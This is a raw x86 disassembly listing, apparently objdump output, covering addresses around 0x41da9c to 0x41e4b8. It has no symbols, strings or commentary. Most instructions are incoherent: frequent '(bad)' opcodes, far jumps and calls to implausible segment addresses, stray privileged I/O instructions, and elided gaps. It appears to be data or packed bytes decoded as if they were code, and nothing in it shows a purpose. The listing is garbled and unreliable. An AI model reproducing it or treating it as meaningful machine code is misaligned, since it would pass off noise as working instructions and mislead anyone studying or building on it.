  41da9c:	adc    DWORD PTR [ecx+ebp*2-0x4c12da14],ecx
  41daa3:	jmp    ebx
  41daa5:	mov    bh,0x1f
  41daa7:	push   0xffffff92
  41daa9:	fsubr  DWORD PTR [ebx+0x1f]
  41daac:	pushf  
  41daad:	outs   dx,DWORD PTR ds:[esi]
  41daae:	push   edx
  41daaf:	or     eax,0x9068fb19
  41dab4:	cmp    eax,0x244c0e97
  41dab9:	sbb    esi,DWORD PTR [esi]
  41dabb:	sbb    DWORD PTR [ecx-0x73a0f132],eax
  41dac1:	mov    dh,0x3d
  41dac3:	arpl   WORD PTR [edi+eax*1+0x17737c9],bx
  41daca:	xchg   edi,eax
  41dacb:	push   0x7ef8a430
  41dad0:	mov    ch,0x54
  41dad2:	mov    ecx,0xf17f9458
  41dad7:	jge    0x41db04
  41dad9:	xlat   BYTE PTR ds:[ebx]
  41dada:	imul   al
  41dadc:	sbb    BYTE PTR [edx],0xc3
  41dadf:	pop    ds
  41dae0:	ror    DWORD PTR [eax+eiz*8],0x90
  41dae4:	mov    DWORD PTR [edx+0xd],esi
  41dae7:	stos   BYTE PTR es:[edi],al
  41dae8:	aad    0x9a
  41daea:	icebp  
  41daeb:	cwde   
  41daec:	call   0x41db8e
	...
  41db55:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41db5c:	cmp    al,0x5f
  41db5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db5f:	push   edi
  41db60:	sbb    ebp,0x25
  41db63:	push   edi
  41db64:	(bad)  
  41db66:	addr16 aas 
  41db68:	add    DWORD PTR [eax],eax
  41db6a:	add    BYTE PTR [ecx],al
  41db6c:	add    BYTE PTR [eax],al
  41db6e:	push   eax
  41db6f:	fsub   st(2),st
  41db71:	aas    
  41db72:	pop    ebp
  41db73:	jns    0x41dbc1
  41db75:	dec    esp
  41db76:	daa    
  41db77:	lea    esp,[ebx-0x52]
  41db7a:	jg     0x41db7a
  41db7c:	xor    DWORD PTR [eax-0x511fd59a],esp
  41db82:	cmc    
  41db83:	stos   DWORD PTR es:[edi],eax
  41db84:	les    esp,FWORD PTR [ecx+0x7027d6a8]
  41db8a:	jg     0x41db4f
  41db8c:	pop    es
  41db8d:	stc    
  41db8e:	aam    0x35
  41db90:	push   ecx
  41db91:	jne    0x41db70
  41db93:	cmp    ch,BYTE PTR [eax-0x32]
  41db96:	sbb    al,0x9a
  41db98:	stos   BYTE PTR es:[edi],al
  41db99:	inc    DWORD PTR [ecx-0x23]
  41db9c:	out    0x61,eax
  41db9e:	xchg   ecx,eax
  41db9f:	mov    ebp,0xb4d8b1d9
  41dba4:	test   al,0x6b
  41dba6:	out    0xec,al
  41dba8:	je     0x41db37
  41dbaa:	fisub  DWORD PTR [eax+0x66]
  41dbad:	call   0x6458:0x2cfb215
  41dbb4:	adc    eax,0x29757c78
  41dbb9:	rcr    DWORD PTR [ecx],1
  41dbbb:	in     eax,dx
  41dbbc:	xor    eax,0xa0946498
  41dbc1:	outs   dx,BYTE PTR ds:[esi]
  41dbc2:	xchg   ecx,eax
  41dbc3:	ja     0x41db6d
  41dbc5:	and    eax,0x2f7a01f6
  41dbca:	dec    esp
  41dbcb:	jmp    FWORD PTR [eax]
  41dbcd:	push   es
  41dbce:	pushf  
  41dbcf:	pop    es
  41dbd0:	ss pop es
  41dbd2:	outs   dx,DWORD PTR ds:[esi]
  41dbd3:	or     eax,0xfaba0938
  41dbd8:	xchg   ecx,eax
  41dbd9:	int    0x69
  41dbdb:	popf   
  41dbdc:	shr    ah,1
  41dbde:	inc    eax
  41dbdf:	ins    BYTE PTR es:[edi],dx
  41dbe0:	ret    
  41dbe1:	sbb    dl,BYTE PTR [ecx]
  41dbe3:	adc    cl,BYTE PTR ds:0x336bab64
  41dbe9:	push   cs
  41dbea:	add    al,0x58
  41dbec:	xor    DWORD PTR [esp+eiz*8-0x3d49fd48],esp
  41dbf3:	ja     0x41dc1d
  41dbf5:	cmp    eax,0x2796a15d
  41dbfa:	imul   ebx,ebx,0x9af706ee
  41dc00:	pop    esp
  41dc01:	pop    edi
  41dc02:	pop    ds
  41dc03:	sbb    ecx,ebx
  41dc05:	retf   0x77aa
  41dc08:	(bad)  
  41dc09:	dec    ecx
  41dc0a:	cmp    al,0xdc
  41dc0c:	out    0x9e,al
  41dc0e:	aam    0xe6
  41dc10:	mov    ds:0xd5bd294e,eax
  41dc15:	not    BYTE PTR [esi+edx*8+0x2c]
  41dc19:	cmp    al,BYTE PTR [edx]
  41dc1b:	pusha  
  41dc1c:	cdq    
  41dc1d:	xchg   DWORD PTR [ecx+0x10],ecx
  41dc20:	cmp    bl,BYTE PTR [edx+0x6410f769]
  41dc26:	and    BYTE PTR [edx],al
  41dc28:	mov    ebp,edi
  41dc2a:	dec    ecx
  41dc2b:	mov    al,ds:0xfae25c81
  41dc30:	cmp    ebx,esp
  41dc32:	xchg   edx,eax
  41dc33:	test   DWORD PTR [eax+0x5b3d9b1],ebp
  41dc39:	mov    ebx,0x148d3c66
  41dc3e:	xchg   DWORD PTR [edi*8+0x39cbc906],esp
  41dc45:	push   esp
  41dc46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc47:	scas   al,BYTE PTR es:[edi]
  41dc48:	push   0xaf628bcf
  41dc4d:	cmp    DWORD PTR [edx],0x69
  41dc50:	jns    0x41dc05
  41dc52:	dec    edi
  41dc53:	sbb    ecx,edi
  41dc55:	aaa    
  41dc56:	je     0x41dbf6
  41dc58:	jge    0x41dc5b
  41dc5a:	inc    ecx
  41dc5b:	jae    0x41dc8d
  41dc5d:	or     esi,edx
  41dc5f:	popf   
  41dc60:	push   edx
  41dc61:	std    
  41dc62:	ds aaa 
  41dc64:	mov    ebx,0x7b595bcc
  41dc69:	popf   
  41dc6a:	pop    es
  41dc6b:	dec    esp
  41dc6c:	in     ax,dx
	...
  41dcd6:	outs   dx,DWORD PTR ds:[esi]
  41dcd7:	retf   0x9815
  41dcda:	mov    ch,0xdf
  41dcdc:	out    dx,eax
  41dcdd:	jmp    DWORD PTR [edi-0x5f4f2fb0]
  41dce3:	pop    DWORD PTR [esi+edi*8]
  41dce6:	addr16 inc eax
  41dce8:	add    DWORD PTR [eax],eax
  41dcea:	add    BYTE PTR [ecx],al
  41dcec:	add    BYTE PTR [eax],al
  41dcee:	fst    st(4)
  41dcf0:	loope  0x41dc73
  41dcf2:	jno    0x41dd2b
  41dcf4:	fxch   st(2)
  41dcf6:	dec    edi
  41dcf7:	shl    BYTE PTR [esi+0x2],1
  41dcfa:	jp     0x41dd01
  41dcfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcfd:	push   edx
  41dcfe:	cmp    esi,DWORD PTR [edi-0x7b5a77]
  41dd04:	add    BYTE PTR [eax+0x49378b35],0x22
  41dd0b:	mov    esp,0xa862dbe3
  41dd10:	or     eax,DWORD PTR [ecx+edx*1]
  41dd13:	shl    DWORD PTR [eax],1
  41dd15:	(bad)  
  41dd16:	jmp    0xda4c74cd
  41dd1b:	mov    edi,0x41926e43
  41dd20:	xlat   BYTE PTR ds:[ebx]
  41dd21:	jns    0x41dcd1
  41dd23:	call   0xdc573ef1
  41dd28:	xchg   esi,eax
  41dd29:	or     edi,0xfffffff6
  41dd2c:	sbb    eax,0x37d74ea3
  41dd31:	dec    eax
  41dd32:	inc    eax
  41dd33:	mov    BYTE PTR [edx+ebp*2-0x59],bl
  41dd37:	xor    al,BYTE PTR [ecx-0x71]
  41dd3a:	adc    al,0x1d
  41dd3c:	and    BYTE PTR [edi],0x1f
  41dd3f:	mov    cl,0xb8
  41dd41:	cwde   
  41dd42:	jmp    0x5a09:0x6b0f49ca
  41dd49:	xchg   esi,eax
  41dd4a:	je     0x41dd90
  41dd4c:	jle    0x41dd41
  41dd4e:	pop    edi
  41dd4f:	lds    edi,FWORD PTR gs:[edi-0x1c]
  41dd53:	mov    ebx,0x7b74f35c
  41dd58:	mov    dl,0x68
  41dd5a:	test   edi,ecx
  41dd5c:	mov    esi,0xf11ff754
  41dd61:	popa   
  41dd62:	jo     0x41dd37
  41dd64:	cmp    BYTE PTR [ebx-0x249aeed0],bh
  41dd6a:	pop    ecx
  41dd6b:	div    BYTE PTR [edi+0x6a817f15]
  41dd71:	pop    ecx
  41dd72:	gs jne 0x41dd61
  41dd75:	sub    DWORD PTR [ecx],esi
  41dd77:	leave  
  41dd78:	ss dec ebp
  41dd7a:	mov    ebp,0xdf60583f
  41dd7f:	dec    ebp
  41dd80:	out    dx,al
  41dd81:	mov    ch,0xfd
  41dd83:	in     eax,dx
  41dd84:	xchg   edi,eax
  41dd85:	mov    cl,ah
  41dd87:	jl     0x41dd84
  41dd89:	ins    BYTE PTR es:[edi],dx
  41dd8a:	inc    ebx
  41dd8b:	js     0x41dd1f
  41dd8d:	mov    edx,gs
  41dd8f:	or     eax,0x1b2746e6
  41dd94:	cli    
  41dd95:	pusha  
  41dd96:	sub    al,0xb9
  41dd98:	mul    BYTE PTR [ecx+0x63]
  41dd9b:	and    edi,DWORD PTR [eax]
  41dd9d:	in     eax,0x29
  41dd9f:	mov    al,bh
  41dda1:	push   0x10
  41dda3:	xor    BYTE PTR [edx+0x43],0xc4
  41dda7:	(bad)  
  41dda8:	mov    BYTE PTR [edx+0x47],ah
  41ddab:	mov    bh,0x68
  41ddad:	push   cs
  41ddae:	js     0x41de01
  41ddb0:	arpl   sp,bx
  41ddb2:	ins    BYTE PTR es:[edi],dx
  41ddb3:	sbb    eax,0x65baa9e4
  41ddb8:	mov    eax,0x87273039
  41ddbd:	add    BYTE PTR [esi+0x5aca7748],al
  41ddc3:	jmp    0xf73d:0xd857f6c
  41ddca:	sub    esp,DWORD PTR ds:0x88c5bddd
  41ddd0:	pop    eax
  41ddd1:	xor    BYTE PTR [ebx],ch
  41ddd3:	add    esp,0x30
  41ddd6:	stos   BYTE PTR es:[edi],al
  41ddd7:	imul   ecx,DWORD PTR [ebp+0x25],0x8143d12e
  41ddde:	jnp    0x41dd74
  41dde0:	and    eax,DWORD PTR [edi+0x7c]
  41dde3:	adc    BYTE PTR [ebp+ecx*8+0x62],dl
  41dde7:	shl    eax,0xbf
  41ddea:	mov    al,ds:0x54d46d
	...
  41de53:	add    BYTE PTR [eax],al
  41de55:	add    BYTE PTR [eax],ah
  41de57:	repz das 
  41de59:	cmp    bh,0xde
  41de5c:	lods   eax,DWORD PTR ds:[esi]
  41de5d:	repz pop ds
  41de5f:	mov    bl,BYTE PTR [esi-0x41]
  41de62:	sub    cl,0xb2
  41de65:	jl     0x41dece
  41de67:	inc    ecx
  41de68:	add    DWORD PTR [eax],eax
  41de6a:	add    BYTE PTR [ecx],al
  41de6c:	add    BYTE PTR [eax],al
  41de6e:	mov    bl,0x9b
  41de70:	cmp    eax,0xf7f91818
  41de75:	jmp    0xdad160ad
  41de7a:	test   DWORD PTR [eax+ecx*2+0x1efec154],edi
  41de81:	fdivr  QWORD PTR [ebx]
  41de83:	jno    0x41de64
  41de85:	xchg   esp,eax
  41de86:	ds in  al,dx
  41de88:	xor    al,BYTE PTR [eax-0x70]
  41de8b:	jl     0x41de88
  41de8d:	fisubr WORD PTR [edx+0x36893aeb]
  41de93:	fstp   st(1)
  41de95:	fsubr  QWORD PTR [ecx]
  41de97:	jp     0x41df0b
  41de99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de9a:	mov    esp,DWORD PTR [eax]
  41de9c:	mov    edx,0x692b69dd
  41dea1:	pop    ss
  41dea2:	repnz sbb DWORD PTR [edi],ecx
  41dea5:	test   al,0x8
  41dea7:	xchg   BYTE PTR [edx-0x65],ch
  41deaa:	pop    ebp
  41deab:	dec    ebx
  41deac:	fidivr DWORD PTR [ecx-0x797d3fc0]
  41deb2:	daa    
  41deb3:	jmp    0xad70:0x61a74db2
  41deba:	lods   al,BYTE PTR ds:[si]
  41debc:	cmp    ah,BYTE PTR [edx+eax*2-0x66]
  41dec0:	pushf  
  41dec1:	aad    0x6a
  41dec3:	mov    dl,0xef
  41dec5:	and    edi,DWORD PTR [ebx+0x51]
  41dec8:	jl     0x41dee3
  41deca:	jbe    0x41dee3
  41decc:	fisttp QWORD PTR [edx]
  41dece:	xchg   ecx,eax
  41decf:	das    
  41ded0:	jae    0x41de5c
  41ded2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ded3:	daa    
  41ded4:	sbb    ah,dl
  41ded6:	loopne 0x41df26
  41ded8:	popa   
  41ded9:	aad    0x8c
  41dedb:	sbb    DWORD PTR [ebx],0xf64a5d29
  41dee1:	lods   al,BYTE PTR ds:[esi]
  41dee2:	mov    esp,0x69112fa4
  41dee7:	mov    dl,0xf5
  41dee9:	cmc    
  41deea:	mov    ah,0xe7
  41deec:	push   0x1306b5dd
  41def1:	jo     0x41de7e
  41def3:	mov    WORD PTR [eax],es
  41def5:	dec    edx
  41def6:	add    esi,edx
  41def8:	fild   WORD PTR [esi-0x1b6c6ed3]
  41defe:	scas   eax,DWORD PTR es:[edi]
  41deff:	pop    edx
  41df00:	xchg   ebx,esp
  41df02:	rcl    BYTE PTR [esi],1
  41df04:	sub    al,0x92
  41df06:	cdq    
  41df07:	cmp    bh,BYTE PTR [eax]
  41df09:	jp     0x41dee3
  41df0b:	mov    ds:0x73be766f,al
  41df10:	push   ebx
  41df11:	pop    ecx
  41df12:	(bad)  
  41df13:	jns    0x41df25
  41df15:	xchg   ebp,eax
  41df16:	mov    cl,0x8f
  41df18:	inc    esi
  41df19:	push   ds
  41df1a:	xchg   edx,eax
  41df1b:	cmp    DWORD PTR [ebp+edx*2-0x27],ebx
  41df1f:	jle    0x41df57
  41df21:	test   DWORD PTR [edi+0x48ff87df],ebx
  41df27:	jp     0x41dead
  41df29:	adc    DWORD PTR [edx+0x70c2578d],esp
  41df2f:	push   cs
  41df30:	cmp    eax,DWORD PTR [ebp-0x24]
  41df33:	push   ebx
  41df34:	mov    esi,0xa17b25c1
  41df39:	add    al,0xb9
  41df3b:	dec    ecx
  41df3c:	call   0xaf75134
  41df41:	shl    BYTE PTR [esi+edi*8+0x6],1
  41df45:	aad    0x24
  41df47:	in     al,0x9c
  41df49:	fadd   DWORD PTR [esi]
  41df4b:	aad    0x65
  41df4d:	mov    al,BYTE PTR [edi]
  41df4f:	mov    bh,0xeb
  41df51:	jns    0x41dfa6
  41df53:	or     DWORD PTR [ebp-0x3cb578a0],esp
  41df59:	enter  0xe1db,0x15
  41df5d:	push   es
  41df5e:	leave  
  41df5f:	js     0x41df68
  41df61:	mov    al,0x70
  41df63:	mov    ?,WORD PTR [ebx-0x7b1a0cb4]
  41df69:	addr16 adc bh,bl
  41df6c:	or     al,0x98
	...
  41dfd6:	aas    
  41dfd7:	daa    
  41dfd8:	push   ss
  41dfd9:	cld    
  41dfda:	push   ds
  41dfdb:	std    
  41dfdc:	jmp    edi
  41dfde:	dec    edi
  41dfdf:	push   0xcdda9ce9
  41dfe4:	xor    ah,al
  41dfe6:	addr16 inc edx
  41dfe8:	add    DWORD PTR [eax],eax
  41dfea:	add    BYTE PTR [ecx],al
  41dfec:	add    BYTE PTR [eax],al
  41dfee:	fimul  WORD PTR [ecx+0x23]
  41dff1:	add    dl,BYTE PTR [esi+edx*1]
  41dff4:	loope  0x41df94
  41dff6:	mov    esi,0x674f1db9
  41dffb:	mov    ecx,0x5b159448
  41e000:	jg     0x41e02f
  41e002:	rcl    BYTE PTR [ebx],cl
  41e004:	add    BYTE PTR [ebx],dh
  41e006:	and    esp,eax
  41e008:	or     BYTE PTR [esp+edi*4+0x40],dl
  41e00c:	push   0xc7ef35e7
  41e011:	inc    eax
  41e012:	aam    0xec
  41e014:	mov    BYTE PTR [ebx],al
  41e016:	dec    ecx
  41e017:	(bad)
  41e01a:	(bad)  
  41e01b:	ja     0x41e09b
  41e01d:	and    BYTE PTR [edi],ah
  41e01f:	repnz and ch,ah
  41e022:	xor    BYTE PTR [ebp+0x1b36905e],bl
  41e028:	ins    BYTE PTR es:[edi],dx
  41e029:	div    BYTE PTR [ebx]
  41e02b:	xchg   edi,eax
  41e02c:	xchg   esi,eax
  41e02d:	js     0x41e0a3
  41e02f:	mov    dl,0x3c
  41e031:	adc    BYTE PTR ds:0x440e1860,0x11
  41e038:	dec    ebx
  41e039:	ins    DWORD PTR es:[edi],dx
  41e03a:	int3   
  41e03b:	mov    ah,0x70
  41e03d:	es mov eax,0x32b491e1
  41e043:	loop   0x41e035
  41e045:	and    eax,0x377b4625
  41e04a:	sbb    esi,DWORD PTR [bp+si-0x3be2]
  41e04f:	sub    eax,0x8fdbf547
  41e054:	out    dx,eax
  41e055:	jecxz  0x41dff0
  41e057:	adc    eax,0xc01e21b0
  41e05c:	pop    ss
  41e05d:	popa   
  41e05e:	add    DWORD PTR [eax-0x76],edi
  41e061:	(bad)  
  41e062:	dec    edi
  41e063:	mov    ch,0x11
  41e065:	std    
  41e066:	push   ecx
  41e067:	das    
  41e068:	jg     0x41dfec
  41e06a:	push   0xa973a76f
  41e06f:	sar    ebp,0x6b
  41e072:	dec    esi
  41e073:	mov    esp,0x77f739de
  41e078:	ja     0x41e016
  41e07a:	pop    edx
  41e07b:	cwde   
  41e07c:	std    
  41e07d:	jo     0x41e033
  41e07f:	or     esi,DWORD PTR [ecx-0x22]
  41e082:	test   BYTE PTR [ebx+0x70],bh
  41e085:	mov    ds:0x38322b31,eax
  41e08a:	mov    al,ds:0xe6de1dd7
  41e08f:	pop    si
  41e091:	fdivp  st(6),st
  41e093:	jno    0x41e093
  41e095:	or     eax,0xae89bb88
  41e09a:	and    dl,BYTE PTR [ecx]
  41e09c:	xor    DWORD PTR [ebx],0x4f
  41e09f:	outs   dx,DWORD PTR ds:[esi]
  41e0a0:	gs mov cl,dh
  41e0a3:	repz rcl BYTE PTR [ebx+0x20b0beaf],cl
  41e0aa:	fwait
  41e0ab:	sahf   
  41e0ac:	mov    esi,0x69cf0431
  41e0b1:	push   ds
  41e0b2:	pop    esi
  41e0b3:	cmp    ebx,esp
  41e0b5:	push   es
  41e0b6:	sti    
  41e0b7:	bound  esi,QWORD PTR [ecx-0x54c5f6f9]
  41e0bd:	inc    ebx
  41e0be:	and    DWORD PTR [edx+0x74],ebp
  41e0c1:	pop    esi
  41e0c2:	test   BYTE PTR cs:[edx],0x66
  41e0c6:	sub    al,BYTE PTR [esi]
  41e0c8:	ins    BYTE PTR es:[edi],dx
  41e0c9:	in     al,dx
  41e0ca:	lock shr BYTE PTR [edi+ecx*1-0x7c],cl
  41e0cf:	mov    edx,0xb85ca789
  41e0d4:	or     BYTE PTR [eax+0x63d75071],al
  41e0da:	mov    bl,0x30
  41e0dc:	(bad)
  41e0e0:	jecxz  0x41e0af
  41e0e2:	fsub   QWORD PTR [esp+ebp*4]
  41e0e5:	loopne 0x41e161
  41e0e7:	loopne 0x41e081
  41e0e9:	rol    DWORD PTR [edx],cl
  41e0eb:	or     al,0x6f
  41e0ed:	jmp    0x0:0x0
	...
  41e154:	add    BYTE PTR [eax],al
  41e156:	dec    edi
  41e157:	push   ebx
  41e158:	add    al,0xc
  41e15a:	sbb    al,0x5f
  41e15c:	dec    edi
  41e15d:	push   ebx
  41e15e:	out    0x6d,eax
  41e160:	aad    0x48
  41e162:	mov    bh,0xad
  41e164:	and    esi,DWORD PTR [edx+0x14367]
  41e16a:	add    BYTE PTR [ecx],al
  41e16c:	add    BYTE PTR [eax],al
  41e16e:	shl    DWORD PTR [edi-0x1c],cl
  41e171:	inc    ebx
  41e172:	stos   DWORD PTR es:[edi],eax
  41e173:	inc    edx
  41e174:	test   BYTE PTR [esp+esi*1-0x6e07a002],dh
  41e17b:	in     eax,dx
  41e17c:	mov    BYTE PTR [eax],ch
  41e17e:	inc    esi
  41e17f:	sub    al,0x79
  41e181:	repz push ecx
  41e183:	xchg   esi,eax
  41e184:	not    BYTE PTR [edi]
  41e186:	iret   
  41e187:	popf   
  41e188:	out    0xf0,al
  41e18a:	mov    bl,0x4e
  41e18c:	lods   al,BYTE PTR ds:[esi]
  41e18d:	ret    0x4150
  41e190:	fistp  WORD PTR [esi-0x592bfc7]
  41e196:	lahf   
  41e197:	mov    ch,0x39
  41e199:	sbb    ebp,esp
  41e19b:	pop    edi
  41e19c:	scas   eax,DWORD PTR es:[edi]
  41e19d:	xor    DWORD PTR [ebx+0x6a666ec0],0x12289cd1
  41e1a7:	xchg   DWORD PTR [si-0x2c03],esp
  41e1ac:	push   ds
  41e1ad:	or     cl,ah
  41e1af:	xor    ebp,eax
  41e1b1:	cmp    ebx,0x208858b9
  41e1b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1b8:	xchg   edx,eax
  41e1b9:	fisttp DWORD PTR [edi]
  41e1bb:	or     eax,0x465c61dc
  41e1c0:	mov    WORD PTR [edx-0x55],ds
  41e1c3:	add    bl,ah
  41e1c5:	mov    eax,0xde26ea4a
  41e1ca:	imul   ebx,DWORD PTR [eax-0x63],0x655ce47
  41e1d1:	inc    esp
  41e1d2:	mov    ch,0xd9
  41e1d4:	out    0x8a,al
  41e1d6:	add    esp,DWORD PTR [eax]
  41e1d8:	retf   
  41e1d9:	add    eax,0xe5e95bc
  41e1de:	and    edi,DWORD PTR [esi]
  41e1e0:	call   DWORD PTR [ebp+eiz*1+0x75f7fdf8]
  41e1e7:	xor    BYTE PTR [eax+0x1],dh
  41e1ea:	xor    ah,al
  41e1ec:	sub    al,0x58
  41e1ee:	out    0x2,al
  41e1f0:	clc    
  41e1f1:	push   esp
  41e1f2:	pop    ss
  41e1f3:	and    edi,DWORD PTR [esi]
  41e1f5:	xchg   edi,eax
  41e1f6:	inc    ebx
  41e1f7:	rcr    ah,0x5e
  41e1fa:	and    bl,BYTE PTR ds:0x837d63dc
  41e200:	scas   al,BYTE PTR es:[edi]
  41e201:	shr    BYTE PTR [ecx*4+0x4a3b5937],0x59
  41e209:	pop    ebp
  41e20a:	xor    edi,DWORD PTR [edx-0x2392928f]
  41e210:	xor    esi,DWORD PTR [eax]
  41e212:	icebp  
  41e213:	push   eax
  41e214:	call   0x9fb26efe
  41e219:	dec    eax
  41e21a:	sub    DWORD PTR [edi+0x6e03d94a],edi
  41e220:	add    ecx,DWORD PTR [eax]
  41e222:	fist   WORD PTR [ebx]
  41e224:	add    eax,0x52a4baf1
  41e229:	xor    eax,0x7087a348
  41e22e:	xchg   edi,eax
  41e22f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e230:	jmp    0x91cd9b7e
  41e235:	rcl    DWORD PTR [eax+0x3e],cl
  41e238:	fsubr  DWORD PTR [edx]
  41e23a:	loope  0x41e23a
  41e23c:	mov    ds:0x3085c8cb,eax
  41e241:	ficomp WORD PTR [ecx]
  41e243:	fs dec ecx
  41e245:	pop    ebp
  41e246:	lods   al,BYTE PTR ds:[esi]
  41e247:	adc    al,bh
  41e249:	xchg   BYTE PTR [edi-0x7be50496],bl
  41e24f:	clc    
  41e250:	scas   al,BYTE PTR es:[edi]
  41e251:	int3   
  41e252:	xchg   ebx,eax
  41e253:	sub    eax,0x30e1714f
  41e258:	adc    DWORD PTR [esp+eiz*8+0x4a],ecx
  41e25c:	retf   0xfdcc
  41e25f:	xchg   ebp,eax
  41e260:	shr    ecx,0x90
  41e263:	jge    0x41e285
  41e265:	aaa    
  41e266:	fbld   TBYTE PTR [eax+0x72]
  41e269:	ja     0x41e2e3
  41e26b:	popf   
  41e26c:	out    dx,eax
  41e26d:	cld    
	...
  41e2d6:	stos   DWORD PTR es:[edi],eax
  41e2d7:	add    dh,BYTE PTR [edi-0x1a]
  41e2da:	push   edi
  41e2dc:	mov    ebx,0x6f64c34f
  41e2e1:	or     al,0x6d
  41e2e3:	xchg   ebx,eax
  41e2e4:	mov    edi,0x144675d
  41e2e9:	add    BYTE PTR [eax],al
  41e2eb:	add    DWORD PTR [eax],eax
  41e2ed:	add    BYTE PTR [ecx+0x56273efb],al
  41e2f3:	sbb    BYTE PTR [esi+0x21],bh
  41e2f6:	and    eax,0x78d9e1b4
  41e2fb:	scas   al,BYTE PTR es:[edi]
  41e2fc:	or     al,0x52
  41e2fe:	pop    ss
  41e2ff:	mov    eax,ds:0x896e3caf
  41e304:	push   0xffffffab
  41e306:	sahf   
  41e307:	xor    al,0x6a
  41e309:	jmp    DWORD PTR [ebp+0x3]
  41e30c:	xor    eax,DWORD PTR [ebp+0x7985b3b4]
  41e312:	xor    al,0xa1
  41e314:	data16 fcom QWORD PTR [edx]
  41e317:	neg    dh
  41e319:	push   edx
  41e31a:	fdivrp st(3),st
  41e31c:	xchg   ecx,eax
  41e31d:	sbb    eax,0x50cc55c2
  41e322:	(bad)
  41e325:	repz mov WORD PTR [ebx],fs
  41e328:	dec    esp
  41e329:	cli    
  41e32a:	cwde   
  41e32b:	and    ah,ch
  41e32d:	and    DWORD PTR [eax-0x2b],edx
  41e330:	pop    ecx
  41e331:	lods   eax,DWORD PTR ds:[esi]
  41e332:	test   ax,0x80ac
  41e336:	in     al,0x95
  41e338:	push   esi
  41e339:	inc    esp
  41e33a:	lock xchg DWORD PTR [edi],esp
  41e33d:	int3   
  41e33e:	stos   BYTE PTR es:[edi],al
  41e33f:	push   ds
  41e340:	lods   al,BYTE PTR ds:[esi]
  41e341:	push   edx
  41e342:	push   esp
  41e343:	sub    DWORD PTR [esi],esi
  41e345:	js     0x41e3af
  41e347:	mov    eax,0xd75edc2c
  41e34c:	dec    eax
  41e34d:	mov    ch,0xe2
  41e34f:	lds    ecx,FWORD PTR [edi]
  41e351:	scas   al,BYTE PTR es:[edi]
  41e352:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e353:	popa   
  41e354:	sub    BYTE PTR [ebx-0x78],0xf3
  41e358:	dec    eax
  41e359:	add    al,0x97
  41e35b:	fwait
  41e35c:	aad    0xff
  41e35e:	adc    bl,BYTE PTR [ecx]
  41e360:	adc    BYTE PTR [di-0x1d],0x5e
  41e365:	xor    BYTE PTR ds:0x2337a1e7,al
  41e36b:	sbb    dh,BYTE PTR [eax+0x1f6a953e]
  41e371:	or     BYTE PTR [edx+0x26],cl
  41e374:	(bad)  
  41e376:	mov    ecx,0x9aaa75d4
  41e37b:	imul   esp,DWORD PTR [edx],0xffffffb6
  41e37e:	pushf  
  41e37f:	xor    dh,bl
  41e381:	fs inc eax
  41e383:	in     al,0xac
  41e385:	dec    esp
  41e386:	retf   0x6f8f
  41e389:	stos   DWORD PTR es:[edi],eax
  41e38a:	mov    ds:0x9b5287e7,eax
  41e38f:	jns    0x41e396
  41e391:	rcr    edx,cl
  41e393:	dec    ebx
  41e394:	add    DWORD PTR [esi],esi
  41e396:	das    
  41e397:	fdivr  DWORD PTR [esi+0x44]
  41e39a:	mov    bl,0x4b
  41e39c:	push   0x22
  41e39e:	mov    ebx,0x745f1048
  41e3a3:	adc    cl,BYTE PTR [eax+0x9]
  41e3a6:	adc    BYTE PTR [ebx],0x1e
  41e3a9:	repz xchg edi,eax
  41e3ab:	iret   
  41e3ac:	sub    eax,0x7ccb5856
  41e3b1:	outs   dx,DWORD PTR ds:[esi]
  41e3b2:	cs ret 
  41e3b4:	dec    esi
  41e3b5:	or     al,0xfe
  41e3b7:	call   0xe1c2:0xc6db85b4
  41e3be:	xor    DWORD PTR [ebx],ebx
  41e3c0:	jb     0x41e3e8
  41e3c2:	(bad)
  41e3c5:	sub    edx,edx
  41e3c7:	test   edx,edx
  41e3c9:	jl     0x41e39e
  41e3cb:	mov    al,0x95
  41e3cd:	arpl   si,di
  41e3cf:	add    DWORD PTR [ebx+0x3d],edi
  41e3d2:	sub    esp,DWORD PTR [ecx]
  41e3d4:	sahf   
  41e3d5:	mov    ds:0xd38cd119,al
  41e3da:	test   al,0xd0
  41e3dc:	ds leave 
  41e3de:	inc    ecx
  41e3df:	cmp    eax,0x6d6d5c36
  41e3e4:	lahf   
  41e3e5:	jnp    0x41e3a4
  41e3e7:	cmp    edx,edx
  41e3e9:	xchg   edi,eax
  41e3ea:	iret   
  41e3eb:	dec    esp
  41e3ec:	leave  
  41e3ed:	sub    al,BYTE PTR [eax]
	...
  41e453:	add    BYTE PTR [eax],al
  41e455:	add    BYTE PTR [ecx-0xe088ee],cl
  41e45b:	jg     0x41e446
  41e45d:	xchg   esi,eax
  41e45e:	or     DWORD PTR [edx+0x18],0x55c0cc09
  41e465:	in     eax,0x67
  41e467:	inc    ebp
  41e468:	add    DWORD PTR [eax],eax
  41e46a:	add    BYTE PTR [ecx],al
  41e46c:	add    BYTE PTR [eax],al
  41e46e:	push   ecx
  41e46f:	jmp    0x17ca:0x6f1468ad
  41e476:	mov    ch,0xa0
  41e478:	cli    
  41e479:	mov    ebp,0x94ccca1e
  41e47e:	scas   eax,DWORD PTR es:[edi]
  41e47f:	push   cs
  41e480:	xor    DWORD PTR [eax+0x325e5fae],ebx
  41e486:	or     dh,dh
  41e488:	xchg   edx,eax
  41e489:	(bad)  
  41e48b:	not    DWORD PTR [ebp+esi*1-0x42079097]
  41e492:	(bad)  
  41e494:	and    cl,bh
  41e496:	cmp    al,0x2d
  41e498:	push   0xffffffad
  41e49a:	xor    al,0xed
  41e49c:	xor    DWORD PTR [edx],edx
  41e49e:	ja     0x41e42b
  41e4a0:	cmp    ah,BYTE PTR [ebx]
  41e4a2:	inc    ebp
  41e4a3:	fsub   QWORD PTR [ebx-0x49]
  41e4a6:	adc    eax,0x9f9ee4aa
  41e4ab:	inc    edx
  41e4ac:	xchg   BYTE PTR [esi],dl
  41e4ae:	fnstcw WORD PTR [edx+eiz*4]
  41e4b1:	dec    ecx
  41e4b2:	mov    WORD PTR [edi-0x47da21a8],?
  41e4b8:	sub    ebp,ebp
